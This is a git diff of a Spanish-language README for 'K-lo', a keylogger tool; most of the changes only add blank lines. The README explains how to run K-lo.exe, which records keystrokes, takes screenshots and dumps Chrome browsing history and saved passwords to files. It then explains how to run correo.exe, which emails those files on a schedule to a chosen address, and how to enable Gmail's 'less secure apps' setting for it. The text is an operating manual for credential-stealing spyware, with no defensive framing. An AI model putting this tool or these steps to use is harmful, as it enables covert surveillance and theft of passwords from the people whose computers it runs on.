@@ -16,12 +16,17 @@ K-lo utiliza la libería pynput por lo que hasta el momento no se ha reportado
 LAG durante su execución, al contrario de la liberia pyhook. 
 
 PRIMER PASO:
+
 Ejecuta el archivo K-lo.exe e ingresa los minutos en los que quieres
 que se actualicen los archivos que se muestran a continuación.
 K-lo.exe es el programa principal que genera:
-1.- Screenshots 
-2.- Excel con historial web de chrome 
+
+1.- Screenshots
+
+2.- Excel con historial web de chrome
+
 3.- Excel con contraseñas guardadas en chrome
+
 4.- El Keylogger se genera y se actualiza cada que el usuario teclee algo. 
      
 Puedes ejecutar K-lo.exe dejarlo que corra y consultar cada cierto tiempo los archivos en la computadora
@@ -36,13 +41,20 @@ ADVERTENCIA: PRIMERO DEBES EJECUTAR K-lo.exe Y DESPUÉS correo.exe
 DE LO CONTRARIO TE MARCARÁ UN ERROR AL EJECUTAR O SIMPLEMENTE NO HARÁ NADA 
 
 SEGUNDO PASO:
+
 Ejecuta el archivo correo.exe
 Sigue las siguientes instrucciones:
+
 1.- Ingresa los minutos en que se enviarán los correos periodicamente (elige un tiempo razonable) 
+
 2.- Ingresa el correo del remitente (quién envía) 
+
 3.- Ingresa la contraseña del remitente 
+
 4.- Ingresa el correo del destinatario 
+
 5.- ESPERA A QUE LA VENTANA SE CIERRE SOLA, al momento que se cierre la pantalla 
+
 se envía un primer email y después se enviará en los minutos que indicaste.
 verifica tu correo para que confirmes que sea correcto, 
 de lo contrario algo hiciste mal al ingresar los datos de los correos. 
@@ -57,10 +69,14 @@ Si el remitente es GMAIL necesitas habilitar el uso de aplicaciones MENOS SEGURA
 inicia sesión y en la opcion habilitar aplicaciones menos seguras elige encendido 
 
 ¡¡LISTO!! 
-Se mostrarán varios archivos pero los importantes son:  
-1.-historialweb.csv: Este es el historial de chrome en formato de excel 
+Se mostrarán varios archivos pero los importantes son:
+
+1.-historialweb.csv: Este es el historial de chrome en formato de excel
+
 2.-passwords.csv: Estas son las contraseñas guardadas en chrome
+
 3.-K-lo.txt: Este es el historial de las teclas oprimidas (keylogger) 
+
 4.-screenshots.png: Estas son las capturas de pantalla 
 
 OJO:
